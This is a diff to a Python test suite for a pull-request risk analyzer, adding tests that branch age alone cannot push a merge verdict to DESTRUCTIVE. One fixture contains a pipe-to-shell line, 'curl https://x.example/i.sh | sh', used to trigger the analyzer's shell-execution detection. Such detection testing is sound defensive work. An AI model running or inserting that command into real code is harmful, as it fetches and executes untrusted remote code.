@@ -1,3 +1,4 @@
+import itertools
 import json
 import os
 import re
@@ -7,7 +8,7 @@ import subprocess
 import sys
 import tempfile
 import unittest
-from datetime import datetime, timezone
+from datetime import datetime, timedelta, timezone
 from io import StringIO
 from unittest.mock import MagicMock, patch
 
@@ -378,8 +379,8 @@ class TestAssessConsequenceDestructive(unittest.TestCase):
     def setUp(self):
         self.a = _make_analyzer()
 
-    def test_branch_over_365_days_and_many_files(self):
-        v = self.a._assess_consequence(60, 0, 400, 0)
+    def test_branch_over_365_days_and_security_deletion(self):
+        v = self.a._assess_consequence(0, 0, 400, 0, security_file_deletions=1)
         self.assertEqual(v["status"], "DESTRUCTIVE")
         self.assertEqual(v["severity"], "CRITICAL")
 
@@ -388,12 +389,12 @@ class TestAssessConsequenceDestructive(unittest.TestCase):
         self.assertEqual(v["status"], "CAUTION")
 
     def test_combined_flags_score(self):
-        v = self.a._assess_consequence(60, 60000, 400, 95)
+        v = self.a._assess_consequence(60, 60000, 400, 95, structural_severity="CRITICAL")
         self.assertGreaterEqual(v["severity_score"], 5)
         self.assertGreater(len(v["flags"]), 1)
 
     def test_recommendation_says_do_not_merge(self):
-        v = self.a._assess_consequence(60, 60000, 400, 95)
+        v = self.a._assess_consequence(60, 60000, 400, 95, structural_severity="CRITICAL")
         self.assertIn("DO NOT MERGE", v["recommendation"])
 
 
@@ -439,6 +440,116 @@ class TestAssessConsequenceCustomThresholds(unittest.TestCase):
         a = _make_analyzer(config=cfg)
         v = a._assess_consequence(4, 0, 0, 0)
         self.assertEqual(v["status"], "REVIEW")
+
+
+class TestBranchAgeCannotDecideDestructive(unittest.TestCase):
+    """AUDIT_LOG §H1: branch age raises the verdict at most to CAUTION; DESTRUCTIVE needs content evidence."""
+
+    def setUp(self):
+        self.a = _make_analyzer()
+
+    def test_age_does_not_lift_caution_content_to_destructive(self):
+        # Actions poisoning HIGH (+3) on a 200-day branch scored 3 + 2 = 5 (DESTRUCTIVE) before §H1.
+        v = self.a._assess_consequence(0, 0, 200, 0, actions_poisoning_flags=1)
+        self.assertEqual(v["status"], "CAUTION")
+        self.assertEqual(v["severity_score"], 4)
+        self.assertEqual(v["branch_age_score"], 1)
+        self.assertIn("Branch is 200 days old (6+ months)", v["flags"])
+
+    def test_age_does_not_lift_review_content_to_destructive(self):
+        # One critical-path deletion (+2) on a 400-day branch scored 2 + 3 = 5 before §H1.
+        v = self.a._assess_consequence(0, 0, 400, 0, critical_file_deletions=1)
+        self.assertEqual(v["status"], "CAUTION")
+        self.assertEqual(v["severity_score"], 4)
+
+    def test_mass_deletion_on_old_branch_matches_fresh_branch(self):
+        # Deletion volume alone scores at most 4 (deletion dimension cap); branch age no
+        # longer turns the same diff into DESTRUCTIVE.
+        fresh = self.a._assess_consequence(60, 60000, 0, 95)
+        old = self.a._assess_consequence(60, 60000, 400, 95)
+        self.assertEqual((fresh["status"], old["status"]), ("CAUTION", "CAUTION"))
+        self.assertEqual((old["severity_score"], old["branch_age_score"]), (4, 0))
+
+    def test_age_still_escalates_safe_content(self):
+        for days, status, score in ((91, "REVIEW", 1), (181, "REVIEW", 2), (366, "CAUTION", 3)):
+            v = self.a._assess_consequence(0, 0, days, 0)
+            self.assertEqual((v["status"], v["severity_score"], v["branch_age_score"]), (status, score, score))
+
+    def test_age_adds_to_destructive_content(self):
+        v = self.a._assess_consequence(0, 0, 400, 0, security_file_deletions=1)
+        self.assertEqual(v["status"], "DESTRUCTIVE")
+        self.assertEqual((v["severity_score"], v["branch_age_score"]), (8, 3))
+
+    def test_age_never_decides_destructive_across_signal_grid(self):
+        """Over every combination of content-signal tiers, branch age never lowers the score
+        and never turns a verdict that is not DESTRUCTIVE at age 0 into DESTRUCTIVE."""
+        signal_tiers = itertools.product(
+            (0, 21, 51),                                                 # files_deleted
+            ((0, 0), (150, 60), (150, 95), (10001, 0), (50001, 95)),     # (lines_deleted, deletion_ratio)
+            ("LOW", "CRITICAL"),                                         # structural_severity
+            (0, 1),                                                      # critical_file_deletions
+            (0, 1),                                                      # security_file_deletions
+            (0, 1),                                                      # unverified_dependencies
+            (0, 1, 2),                                                   # content_flags
+            ((0, False), (1, False), (1, True)),                         # Actions poisoning
+            ((0, False), (1, False), (1, True)),                         # AI config poisoning
+        )
+        for files, (lines, ratio), structural, crit, sec, unv, cf, (af, ac), (aif, aic) in signal_tiers:
+            kwargs = dict(
+                structural_severity=structural, critical_file_deletions=crit, security_file_deletions=sec,
+                unverified_dependencies=unv, content_flags=cf, actions_poisoning_flags=af,
+                actions_poisoning_critical=ac, ai_config_poisoning_flags=aif, ai_config_poisoning_critical=aic,
+            )
+            fresh = self.a._assess_consequence(files, lines, 0, ratio, **kwargs)
+            self.assertEqual(fresh["branch_age_score"], 0)
+            for days in (91, 181, 366):
+                aged = self.a._assess_consequence(files, lines, days, ratio, **kwargs)
+                case = (files, lines, ratio, days, kwargs)
+                self.assertEqual(aged["severity_score"] - fresh["severity_score"], aged["branch_age_score"], case)
+                self.assertGreaterEqual(aged["branch_age_score"], 0, case)
+                if fresh["status"] != "DESTRUCTIVE":
+                    self.assertNotEqual(aged["status"], "DESTRUCTIVE", case)
+
+
+class TestBranchAgeSemanticEscalation(unittest.TestCase):
+    """AUDIT_LOG §H1: a deceptive description escalates CAUTION to DESTRUCTIVE only when the
+    content evidence reaches CAUTION, not when branch age does."""
+
+    _DECEPTIVE = {"status": "DECEPTIVE_PAYLOAD", "mci_score": 0.7,
+                  "signals": ["scope_understated", "operation_mutation"]}
+
+    def _verdict(self, added_files, days_old):
+        branch_date = datetime(2025, 1, 1, tzinfo=timezone.utc)
+        a = _make_analyzer()
+        branch_commit = MagicMock(committed_datetime=branch_date, hexsha="aabbccddeeff")
+        target_commit = MagicMock(committed_datetime=branch_date + timedelta(days=days_old), hexsha="112233445566")
+        a.repo.commit.side_effect = lambda ref: target_commit if ref == "main" else branch_commit
+        a.repo.iter_commits.return_value = []
+        diffs = []
+        for path, text in added_files:
+            d = MagicMock(change_type="A", b_path=path)
+            d.b_blob.data_stream.read.return_value = text.encode("utf-8")
+            diffs.append(d)
+        merge_base_commit = MagicMock(hexsha="deadbeef00000000")
+        merge_base_commit.diff.return_value = diffs
+        a.repo.merge_base.return_value = [merge_base_commit]
+        a.repo.git.diff.return_value = "\n".join(f"1\t0\t{path}" for path, _ in added_files)
+        with patch.object(SemanticTransparencyAnalyzer, "analyze_transparency", return_value=dict(self._DECEPTIVE)):
+            result = a.analyze(pr_description="minor typo")
+        self.assertNotIn("error", result)
+        return result["verdict"]
+
+    def test_deception_on_age_only_caution_stays_caution(self):
+        # No content signals; a 400-day branch scores 3 (CAUTION) from age alone.
+        v = self._verdict([("README.md", "# Hello\n")], days_old=400)
+        self.assertEqual(v["status"], "CAUTION")
+        self.assertTrue(any(f.startswith("Semantic mismatch") for f in v["flags"]))
+
+    def test_deception_on_content_caution_escalates_to_destructive(self):
+        # Two added files with shell execution patterns score 4 (CAUTION) with no branch age.
+        shell = "curl https://x.example/i.sh | sh\n"
+        v = self._verdict([("notes.txt", shell), ("setup.txt", shell)], days_old=0)
+        self.assertEqual(v["status"], "DESTRUCTIVE")
 
 
 # ==============================================================================
